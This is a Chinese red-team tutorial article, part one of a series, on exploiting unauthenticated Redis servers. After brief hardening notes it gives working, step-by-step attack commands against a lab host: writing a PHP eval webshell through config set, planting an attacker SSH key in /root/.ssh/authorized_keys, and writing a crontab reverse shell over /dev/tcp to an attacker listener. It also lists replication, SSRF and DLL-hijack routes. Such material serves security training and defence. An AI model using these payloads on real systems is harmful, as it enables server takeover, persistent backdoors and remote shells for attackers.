#  全文干货！Redis漏洞利用详解 （上）   
原创 LULU  红队蓝军   2024-09-13 18:10  
  
## redis漏洞利用原理   
  
Redis是一套开源的使用ANSI C编写、支持网络、可基于内存亦可持久化的日志型、键值存储数据库，并提供多种语言的API。Redis 提供了2种不同的持久化方式，RDB方式和AOF方式.  
```
Redis默认情况下是绑定在0.0.0.0:6379端口的，如果没有设置密码（一般密码为空）或者密码为弱密码的情况下并且也没有进行有效保护措施，那么处于公网的redis服务就会被任意的用户未授权访问，读取数据，甚至利用 Redis 自身提供的 config 命令像目标主机写WebShell、写SSH公钥、创建计划任务反弹Shell等。恶意攻击者利用redis未授权漏洞进行进一步攻击。

```  
## redis端口的相关知识   
```
一、Redis默认端口
Redis的默认端口是6379，这个端口可以在Redis的配置文件redis.conf中进行配置。如果没有手动修改配置文件，则Redis默认监听端口为6379。

二、查看Redis端口是否开启
在Linux系统中，可以通过命令netstat -anp | grep 6379来查看Redis监听的端口是否开启。如果端口开启，则会显示出Redis的进程号和监听端口号。

三、如何关闭Redis的端口
在某些场景下，我们需要关闭Redis的监听端口，以达到保护Redis的目的。关闭Redis的端口并不会影响Redis实例的正常运行。
----  方法一：在redis.conf文件中注释掉bind 127.0.0.1这行配置语句。这样就可以关闭Redis的监听端口，在本地无法通过网络访问Redis了。
---- 方法二：使用iptables命令来关闭Redis的端口，这种方式可以在防火墙层面进行封禁。
iptables -I INPUT -p tcp –dport 6379 -j DROP
这条命令会在防火墙规则中添加一条针对6379端口的规则，将其drop掉。
----方法三：使用Redis的security功能来关闭端口。

----在redis.conf文件中添加如下配置：
requirepass yourpassword  #其中yourpassword是你设置的密码，可以是任意字符串。添加这个配置后，只有通过密码认证的客户端才能连接Redis。
protected-mode yes

四、如何开启Redis的端口
----方法一：修改redis.conf配置文件。在redis.conf中将bind 127.0.0.1这行注释掉或者改成bind 0.0.0.0，以允许所有客户端连接Redis。
----方法二：在iptables中开启Redis的端口。使用以下命令来开启6379端口。
iptables -I INPUT -p tcp –dport 6379 -j ACCEPT
这条命令会在防火墙规则中添加一条针对6379端口的规则，允许客户端连接。
----方法三：使用Redis的security功能来开启端口。

----在redis.conf文件中添加如下配置：
requirepass yourpassword  其中yourpassword是你设置的密码，可以是任意字符串。
protected-mode no


五、保护Redis端口的安全
在开放Redis的端口时，一定要注意Redis的安全问题。建议使用密码进行身份验证，限制可连接客户端的IP地址，避免不必要的风险。
只允许可信任的IP地址连接Redis。可以添加以下配置限制可连接的IP地址。
127.0.0.1:6379
172.16.0.0/16:6379
192.168.0.0/24:6379
这些配置会只允许本机127.0.0.1、172.16.0.0/16、192.168.0.0/24的IP地址连接Redis

```  
## 漏洞利用方式   
  
<table><thead><tr><th style="line-height: 1.5em;letter-spacing: 0em;text-align: left;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);width: auto;height: auto;border-top-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;min-width: 85px;">方式</th><th style="line-height: 1.5em;letter-spacing: 0em;text-align: left;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);width: auto;height: auto;border-top-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;min-width: 85px;">利用前提</th></tr></thead><tbody style="line-height: 1.5em;letter-spacing: 0em;border-width: 0px;border-style: initial;border-color: initial;"><tr style="background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(255, 255, 255);width: auto;height: auto;"><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;">写webshell</td><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;word-break: break-all;">1、  知道网站绝对路径，并且需要增删改查权限（有IIIS服务，可以尝试<code>C:/inetpub/wwwroot/</code>写Webshell）                 2、 root启动redis                                                               3、redis弱密码或者无密码。</td></tr><tr style="background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(248, 248, 248);width: auto;height: auto;"><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;">写ssh-keygen 公钥</td><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;word-break: break-all;">1、Redis服务使用ROOT账号启动                                         2、服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器</td></tr><tr style="background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(255, 255, 255);width: auto;height: auto;"><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;">创建计划任务反弹shell</td><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;word-break: break-all;">1、root启用Redis                                                                2、redis无密码或者弱密码</td></tr><tr style="background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(248, 248, 248);width: auto;height: auto;"><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;word-break: break-all;">redis主从复制getshell</td><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;word-break: break-all;">1、Redis 版本(4.x~5.0.5)   新增模块加载功能，可以通过C语言并编译出恶意.so文件。3.x的Redis并没有模块加载的功能                                                                                        2、redis弱密码或者无密码                                                3、root启动redis</td></tr><tr style="background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(255, 255, 255);width: auto;height: auto;"><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;">ssrf攻击内网redis</td><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;word-break: break-all;">1、利用 gohper 协议攻击redis                                         2、利用 dict 协议攻击redis</td></tr><tr style="background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(248, 248, 248);width: auto;height: auto;"><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;">DLL劫持</td><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;">劫持dbghelp.dll，主从复制写入恶意DLL并通过Redis命令触发</td></tr></tbody></table>  
## 漏洞环境部署   
  
**linux**  
```
启动redis服务器
#第一步 wget http://download.redis.io/releases/redis-2.8.17.tar.gz    #下载redis
第二步 tar -zxvf redis-2.8.17.tar.gz         #解压安装包
第三步 cd redis-2.8.17          #进入redis文件夹
第四步 make            #在redis-2.8.17文件夹下执行make
第五步 cd src         #进入redis-2.8.17文件夹下的src文件夹
第六步 ./redis-server ../redis.conf     #使用上级/目录下的reids.conf文件中的配置启动redis服务

```  
  
linxu配置文件redis.conf  
```
bind 0.0.0.0  #bind前面#注释符去掉
protected-mode no #将protected-mode 后面改为no

```  
  
开启redis客户端  
```
redis-cli -h ip

```  
  
**windows**  
  
启动Redis服务  
```
第一步：# 项目下载，根据需要下载相应版本
https://github.com/tporadowski/redis/releases/tag/v5.0.14.1 
第二步：启动Redis服务 
redis-server.exe

```  
  
windows配置文件是redis.windows.conf  
```
bind 0.0.0.0  #bind前面#注释符去掉
protected-mode no #将protected-mode 后面改为no

```  
  
开启redis客户端  
```
redis-cli.exe -h 192.168.111.141 #ip是你靶机的IP地址，端口可加可不加。
#redis-cli.exe -h 192.168.111.141 -p 6379

```  
## 漏洞利用   
### 写入webshell  
  
redis默认的端口是6379 ，通常情况下会更改端口，可以利用burp对端口进行爆破  
  
redis是需要密码认证的，可以利用脚本爆破弱口令的密码  
  
**复现步骤**  
```
1、检测方法 
先用 nmap 扫描查看端口开放情况发现开放的 6379 端口为 Redis 的默认端口 ，这里也有可能端口进行更改
Nmap -A -p 6379 --script redis-info 192.168.10.153

Nmap 扫描后发现主机的 6379 端口对外开放可以通过 Redis 客户端进行连接测试是否存在未授权访问漏洞 比如： 
./redis-cli -h 192.168.10.153
Info
就可以看到 Redis 的版本和服务器上内核的版本信息，也就证明存在未授权访问漏洞。

2、网站写码
① 先用客户端连接服务器的 redis 服务
redis-cli.exe -h 目标IP
② 连接后设置目录 
config set dir /var/www/html（通过信息收集得到路径，同时具有写的权限）
③ 设置要写入的文件名 
config set dbfilename shell.php
④ 设置要写入的内容 
set webshell "<?php @eval($_POST['123']); ?>"
⑤ 保存 
save
⑥ 保存后用菜刀、蚁剑、哥斯拉、冰蝎连接此木马得到 webshell。

```  
  
**复现**  
  
拿到webshell  
```
开启http服务 ：systemctl start httpd.service
查看http服务状态:service httpd status
将shell.php 文件放在/var/www/html下 ,使用webshell管理工具进行连接

```  
### 写公钥  
  
首先理解什么是ssh，为什么ssh公钥能实现登录。  
  
SSH是一种网络协议，端口是22，用于计算机之间的加密登录。如果一个用户从本地计算机，使用SSH协议登录另一台远程计算机，我们就可以认为，这种登录是安全的，即使被中途截获，密码也不会泄露。  
  
认证机制:  
```
- (1）远程主机收到用户的登录请求，把自己的公钥发给用户。
- （2）用户使用这个公钥，将登录密码加密后，发送回来。
- （3）远程主机用自己的私钥，解密登录密码，如果密码正确，就同意用户登录。
如果攻击者在本地建个 ssh 的密钥（包含公钥和私钥），并将生成公钥里面的内容写入redis远程服务器中(开启了ssh服务)，那么远程服务器通过ssh协议发送过去的公钥，则是攻击者在本地生成的公钥。有点类似于中间人攻击。

```  
  
**复现步骤**  
```
1、确保靶机开启ssh密钥登陆：在/etc/ssh/sshd_config中
2、第二步：攻击机上生成密钥，目的主要是得到公钥
3、第三步：连接redis服务，将公钥写入到远程redis服务器上
4、在攻击机上利用私钥登录 实现免密码成功登陆

```  
  
**复现**  
  
第一步：首先要保证靶机环境开启了SSH服务，也就是22端口是开放的  
  
**靶机上**开启ssh密钥登陆：在/etc/ssh/sshd_config中  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7794fMt5BUxfWennCBso4LfBW8pV471rsbic7z97PEQsESTT7EWuukULZanwsLTIIlrjyAaX3DAng/640?wx_fmt=png&from=appmsg "")  
  
如果本身服务器是支持密钥登陆的话，在对应用户的目录下肯定是存在一个.ssh目录的。  
  
2、第二步：攻击机上生成密钥，目的主要是得到公钥  
  
执行：ssh-keygen -t rsa 生成密钥， 有几个选项直接回车即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7794fMt5BUxfWennCBso4L2rGxkiaGiclOibmWVcd2NJ7Lc7lzM9vBujtx8kUniaqWn14mibTyTflvhaw/640?wx_fmt=png&from=appmsg "")  
  
会生成一个私钥、公钥，我们是将公钥写入到远程redis服务器上  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7794fMt5BUxfWennCBso4LdTLBD5CYINRGp29cXxPLTjTJAtkibibdvpaXt4ZJ8Vwx5VF6fa0LDwOg/640?wx_fmt=png&from=appmsg "")  
  
3、第三步：在攻击机上连接redis执行如下命令:  
```
┌──(kali㉿kali)-[~]
└─$ redis-cli -h 192.168.3.141
192.168.3.141:6379> config set dir /root/.ssh  #对应的root用户目录下.ssh  这个路径是固定的
OK
192.168.3.141:6379> config set dbfilename authorized_keys #文件名固定
OK
192.168.3.141:6379> set name "\n\n\nssh-rsaAAAAB3NzaC1yc2EAAAADAQABAAABgQDnaEHp2S3nNwZx8jr177hZVrjSf2oSktMfJG+8RyWXg/OiNmZt4VoRsZLgz3a5Y7+Z/P3/l/KkOTIc9mgK9LAQEJn97Nn4+RTMbNNWL8k4YaM8EOIEulPgJHmZrDBauNfGgl/QObBxil2uHEB/G1EweWJVWe4AONDUCkmGZSRE5XixzzldXPczkJnzn1MP+LqEEI5MMTaVmYnVOuvklLVJg7bQ1h7fpEhlPgqWvl6xY56eNSUuQuUxHoKcrQsGLXHk+4fKNyjGI0+8kTfGtZ1C6wUynF8sYcIN0Bl02Ho8UGfY1u71h+lE6cPwO3M2Yer55ii7uoeT27yv3s9eLu4aD5zIXqlhKpupHfTabk8HiIpqMbQjDW51e2lm6ikGSHzHZ79QkjRJ4HTfkoWSCGC/bio+pLAoIz60tt9Jj9pByXNVLHjka4ZR+3bmAp/HB1yMFYNLrhf2pqqe0Ovl7UQ/DIoJnwIFyIchevSbDHu+YfMN16woinVTg/uEk4u20KE=root@kali\n\n\n"   #此处内容是在攻击机上将生成的公钥进行复制
OK
192.168.3.141:6379> save  #将authorized_keys文件中的公钥保存到 /root/.ssh
OK
192.168.3.141:6379>

```  
  
4、第四步：登录  实现免密码成功登陆  
```
ssh -i 私钥 用户@主机地址

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7794fMt5BUxfWennCBso4Lchd2QUoatdP7tqJWtzLS1MwDQRLFYmZXUUOqBdg0z1h3WuLDibXKdIg/640?wx_fmt=png&from=appmsg "")  
### 创建计划任务反弹shell  
  
利用crontab计划任务getshell  
  
crontab 是一个用于在Linux和Unix系统上安排和管理定期执行的任务的命令行工具。crontab文件保存在/var/spool/cron目录下，只要我们使用远程Redis服务将反弹shell的命令写入计划任务文件中，他就会定期执行一次反弹shell命令  
  
**复现步骤**  
```
1、攻击机 监听 nc -lvp 9898
2、执行反弹shell命令：bash -i >& /dev/tcp/172.16.101.119/9898 0>&1
3、利用Linux的crontab来实现反弹shell
注意：前提条件，redis以root权限运行，才能通过写crontab来执行命令，反弹shell攻击机链接上redis并执行如下命令：

┌──(kali㉿kali)-[~]
└─$ redis-cli -h 192.168.3.141
192.168.3.141:6379> set name "\n\n*/1 * * * * /bin/bash -i\>&/dev/tcp/172.16.101.119/9898 0>&1\n\n"
OK
192.168.3.141:6379> config set dir /var/spool/cron
OK
192.168.3.141:6379> config set dbfilename root
OK
192.168.3.141:6379> save
OK
192.168.3.141:6379>

\# 每分钟执行一次反弹代码 (bash -i 创建一个交互的bash shell /dev/tcp/是Linux中的一个特殊设备文件,实际这个文件是不存在的，它只是 bash 用来实现网络请求的一个接口。打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输据)
set name "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/192.168.3.128/9898 0>&1\n\n"
\# 定义文件保存路径，这是定时任务的默认保存路径，所有定时任务都在这里面保存
config set dir /var/spool/cron
\# root时当前登录用户的用户名，我当前是使用root登录的，切记这一点。这个地方写登陆用户名，不然成功不了
config set dbfilename root

```  
  
这里需要理解定时任务  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7794fMt5BUxfWennCBso4LNib3ZyIWtzbvNmtQa1BpXiaTb0XsStyMmODt9Y0XyI8Oot2qnEWkFY6g/640?wx_fmt=png&from=appmsg "")  
```
* * * * * root ./opt/soft/redis/src/redis-cli 每分钟去执行对应命令
*/3 * * * * root ./opt/soft/redis/src/redis-cli 每隔3分钟去执行对应的命令
# 在每天凌晨2:05去进行数据库的备份
5 2 * * * root mysqldump --databases .....> data.sql
# 在每周5凌晨2:05去进行数据库的备份
5 2 * * 5 root mysqldump --databases .....> data.sql

```  
  
**复现**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7794fMt5BUxfWennCBso4L1oPBgwEVESGOgqx7iay5UbVkIxAWBz6Gb4LekkGUhpmbdfEoA7vzYFw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7794fMt5BUxfWennCBso4LcDLJNI0pMuYNibGwicNSIFSOrz4k3mTibI43yMC3qEnJndq4VtzT7ZMtw/640?wx_fmt=png&from=appmsg "")  
  
下一篇文章在具体讲解关于redis主从复制getshell、ssrf攻击内网redis 、以及DLL劫持的利用。  
  
加下方wx，拉你一起进群学习  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ibZ6uZjjH3v5KP8CaWoS7GAJnWQQxPpibNdibOdl0hc3X6uuBy7rLVOoxS0OSd4vdHWcibFpZg9T9Bx6T7Rn87RoIw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
